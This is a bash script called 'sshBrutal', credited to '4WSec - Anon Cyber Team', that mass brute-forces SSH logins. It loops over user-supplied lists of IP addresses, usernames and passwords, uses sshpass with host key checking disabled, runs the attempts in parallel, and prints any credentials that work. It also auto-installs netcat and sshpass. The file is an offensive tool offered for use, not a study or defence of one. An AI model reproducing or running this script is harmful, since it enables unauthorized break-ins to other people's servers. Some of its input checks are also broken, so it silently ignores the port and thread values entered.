#!/bin/bash

# sshBrutal
# Release on 23/12/2018
# Github: github.com/aryanrtm/sshBrutal
# © Copyright ~ 4WSec

# color
PP='\033[95m' # purple
CY='\033[96m' # cyan
BL='\033[94m' # blue
GR='\033[92m' # green
YW='\033[93m' # yellow
RD='\033[91m' # red
NT='\033[97m'  # netral


function header(){
printf "
\t${RD}           _     ______                          _  
\t${RD}          | |   (____  \               _        | | 
\t${RD}  ___  ___| |__  ____)  ) ____ _   _ _| |_ _____| | 
\t${RD} /___)/___)  _ \|  __  ( / ___) | | (_   _|____ | | 
\t${RD}|___ |___ | | | | |__)  ) |   | |_| | | |_/ ___ | | 
\t${RD}(___/(___/|_| |_|______/|_|   |____/   \__)_____|\_)

\t${YW}Author: ${GR}4WSec - Anon Cyber Team
\t${YW}sshBrutal ${GR}Is Multiple IP Dictionary Attack
\t----------------------------------------------------

"
}


function chk_depen(){
	clear
	if [[ -f "dependencies.conf" ]]; then
		sleep 1
	else
		printf "\t ${BL}[!] ${NT}Checking Guns ..........\n"
		echo ""
		touch dependencies.conf
		echo "# 4WSec And They BOT Just Dropped Yo SSH" >> dependencies.conf
		sleep 1
		nc -h > /dev/null 2>&1
		if [[ $? -eq 0 ]]; then
			printf "\t ${YW}Netcat ${NT}.......... ${GR}[✔]\n"
			echo "netcat = yes" >> dependencies.conf
		else
			printf "\t ${YW}Netcat ${NT}.......... ${RD}[✘]\n"
			sleep 1
			apt-get install netcat -y
		fi
		sshpass -h > /dev/null 2>&1
		if [[ $? -eq 0 ]]; then
			printf "\t ${YW}SSHPass ${NT}.......... ${GR}[✔]\n"
			echo "sshpass = yes" >> dependencies.conf
		else
			printf "\t ${YW}SSHPass ${NT}.......... ${RD}[✘]\n"
			sleep 1
			apt-get install sshpass -y
		fi
		sleep 5
		clear
	fi
}


function attack_ssh(){
	printf "\t${YW}[Attacking The IP: ${NT}$ipls:$p0rt${YW}] [User: ${NT}$userls${YW}] [Pass: $passls]\n"
	l0g1n=$(sshpass -p "$passls" ssh -o StrictHostKeyChecking=no "$userls"@"$ipls" -p $p0rt uname -a 2> /dev/null | grep -c "0" ); 
	if [[ $l0g1n == "1" ]]; then
		printf "\t${RD}[IP Was Attacked: ${GR}$ipls:$p0rt${RD}] [User: ${GR}$userls${RD}] [Pass: ${GR}$passls]\n"
	fi
}


function run_sshbrutal(){
	con=1
	clear
	chk_depen
	header
	read -p "        Enter IP List: " ip_list;
	if [[ ! -e $ip_list ]]; then
		printf "\t${RD}[!] ${YW}File Not Found\n"
		exit
	fi
	read -p "        Enter Port (Default 22): " p0rt;
	if [[ $p0rt="" ]]; then
		p0rt=22
	fi
	read -p "        Enter Username List: " us3rnm;
	if [[ ! -e $us3rnm ]]; then
		printf "\t${RD}[!] ${YW}File Not Found\n"
		exit
	fi
	read -p "        Enter Password List: " p4sswd;
	if [[ ! -e $p4sswd ]]; then
		printf "\t${RD}[!] ${YW}File Not Found\n"
		exit
	fi
	read -p "        Enter Threads: " threads;
	if [[ $threads="" ]]; then
		threads=10
	fi
	echo ""
	for ipls in $(cat $ip_list); do
	for userls in $(cat $us3rnm); do
	for passls in $(cat $p4sswd); do
		fast=$(expr $con % $threads)
		if [[ $fast == 0 && $con > 0 ]]; then
			sleep 3
		fi
		attack_ssh &
		con=$[$con+1]
	done
	done
	done
	wait
}
run_sshbrutal